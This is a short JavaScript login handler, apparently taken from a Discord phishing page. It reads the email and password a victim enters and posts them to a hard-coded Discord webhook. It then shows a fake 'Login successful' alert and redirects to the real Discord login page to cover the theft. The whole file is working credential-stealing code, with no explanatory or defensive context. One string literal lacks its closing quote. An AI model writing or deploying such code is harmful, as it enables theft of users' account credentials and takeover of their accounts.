function login() {
    var password = document.getElementById('uid_7').value;
    var email = document.getElementById('uid_5').value;

    if (email !== '' && password !== '') {
        var data = {
            content: 'Login attempt',
            embeds: [
                {
                    title: 'Login Information',
                    fields: [
                        { name: 'Email', value: email },
                        { name: 'Password', value: password }
                    ]
                }
            ]
        };

        // YOUR WEBHOOK DISCORD
        fetch('https://discord.com/api/webhooks/1215543172764143616/nXdVTBL4NXbxbEel8S0_ETIPgkL9lY6Q_F_b_FuZx_yX4Ys1_vZt48zkH1JDx4RK1PEG, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            alert("Login successful");
            window.location.href = "https://discord.com/login"
        })
        .catch(error => {
            console.error(error);
            alert("Something went wrong. Please try again.");
            window.location.href = "https://discord.com/login"
        });

    } else {
        alert('Complete all fields');
    }
}
